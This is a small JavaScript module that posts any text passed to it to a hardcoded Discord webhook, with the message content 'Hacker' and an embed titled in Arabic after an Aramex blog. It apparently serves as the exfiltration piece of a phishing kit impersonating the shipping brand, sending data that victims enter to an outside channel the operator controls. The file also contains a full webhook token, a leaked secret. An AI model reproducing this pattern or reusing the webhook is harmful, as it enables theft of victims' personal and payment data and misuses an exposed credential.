import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1337778597485740082/Y7b-a4LwZTg1aEwImo4J-_MUBnjG3fXAbhwFT5m3zUfhXg2lxb95dtws5g6K4BID05ot5207069904535694/B8iXi57-JN-cTcRw0D_uws8yPwTdZwBlguH-QvJsk_7WUNkzF_LwjIC9ZFjRG8IdekL-",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
